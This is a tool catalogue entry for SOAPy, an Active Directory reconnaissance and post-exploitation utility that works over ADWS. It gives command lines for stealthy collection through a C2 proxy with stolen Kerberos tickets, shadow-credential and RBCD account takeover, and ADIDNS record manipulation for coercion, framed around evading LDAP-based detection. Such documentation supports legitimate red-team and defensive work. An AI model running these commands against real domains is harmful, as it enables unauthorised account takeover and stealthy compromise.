---
name: "soapy"
categories:
  - windows
homepage: "https://github.com/logangoins/SOAPy"
origin: "hacktricks"
recipe: "upstream"
packaged-by: []
build-system: python
license: see repository
meta-checked: "2026-11-13"
github-repo: "logangoins/SOAPy"
github-match: "exact"
github-stars: 224
gh-checked: "2026-11-13"
worth: 5.4
worth-basis: "full (activity+popularity+recency+adoption)"
worth-checked: "2026-11-13"
---

# soapy

> AD recon and post-exploitation through the Active Directory Web Services (ADWS) protocol — BloodHound-grade collection and LDAP-write tradecraft over port 9389, tunneled through SOCKS.

## What it's for

SOAPy (Jackson Leverett, ex-IBM X-Force Red) talks to Active Directory
through ADWS (TCP 9389) instead of LDAP, with original Python
implementations of the underlying .NET protocols (MS-NNS NegotiateStream,
MC-NMF message framing, NBFSE binary SOAP). Because management traffic
and tooling watch LDAP, enumerating and writing through ADWS can evade
identity-detection platforms built on LDAP monitoring — the intended use
is stealthy collection through a SOCKS5 proxy from a C2 agent, using a
stolen Kerberos ticket rather than credentials. Collection output feeds
BOFHound to produce BloodHound-compatible JSON; post-exploitation writes
include targeted kerberoasting (SPN), AS-REProast (userAccountControl),
RBCD, Shadow Credentials (`msDs-KeyCredentialLink`) and ADIDNS record
manipulation for coercion. For a scriptable Golang ADWS client without
the SOCKS-first design, see [[sopa]].

*No corpus evidence — derived from upstream documentation.

## Typical use cases

### Collect through a C2 SOCKS proxy with a stolen ticket

The flagship workflow: proxychains + Kerberos, no plaintext credentials.

```
KRB5CCNAME=ticket.ccache proxychains4 SOAPy -k corp.example.com/'user'@dc01.corp.example.com -q '(objectclass=computer)'
```

Outcome: runs the LDAP-style query through ADWS over the SOCKS5 proxy
configured in `proxychains4.conf`, authenticating with the ccache ticket;
constrained queries like this are the recommended opsec-safe collection
form. Password, NT hash (`-nt`), and simple `-k`-less connections use the
same `domain/user[:password]@target` connection argument.

### Targeted enumeration in one pass

Pull the principal sets you care about.

```
SOAPy corp.example.com/'user':'Password1'@dc01.corp.example.com --users --groups --spns --asreproastable
```

Outcome: enumerates the requested object classes over ADWS and prints
them; other collection flags include `--computers`, `--admins`,
`--rbcds`, `--constrained`/`--unconstrained`, or a raw filter with
`-q '(sAMAccountName=admin*)'` plus attribute projection `-f attr,attr`.

### Ingest into BloodHound via BOFHound

Turn ADWS collection into attack-path data.

```
SOAPy corp.example.com/'user':'Password1'@dc01.corp.example.com --show > dump.log
bofhound -i dump.log --zip
```

Outcome: `--show` prints the raw collected records to stdout; BOFHound
parses `dump.log` and emits BloodHound-compatible JSON zip files for
upload into BloodHound.

### Shadow credentials over ADWS

Take over an account with write rights while touching no LDAP.

```
SOAPy corp.example.com/'user':'Password1'@dc01.corp.example.com --shadow-creds add --shadow-target administrator
```

Outcome: generates a key credential, writes it to the target's
`msDs-KeyCredentialLink` over ADWS, and saves a PFX plus printed
password — then PKINIT-authenticate as the target (e.g.
`certipy auth -pfx file.pfx`). `--shadow-creds remove` with
`--device-id` undoes it.

### RBCD takeover through ADWS

Write delegation rights the stealthy way.

```
SOAPy corp.example.com/'user':'Password1'@dc01.corp.example.com --rbcd add --rbcd-source ATTACKER$ --rbcd-target TARGET$
```

Outcome: adds the source principal's `msDS-AllowedToActOnBehalfOfOtherIdentity`
write on the target over ADWS — complete the attack by impersonating a
sensitive user to the target with S4U tooling.

### Manipulate ADIDNS records for coercion

Add wildcard/hostname records pointing at your host.

```
SOAPy corp.example.com/'user':'Password1'@dc01.corp.example.com --dns-add host.corp.example.com --dns-ip 198.51.100.10
```

Outcome: creates the DNS record through ADWS (`--dns-modify`,
`--dns-remove`, `--dns-tombstone` and `--dns-resurrect` manage the
lifecycle; `--ttl` sets the TTL) — enabling authentication-coercion
campaigns (PetitPotam-class) against the pointed host.
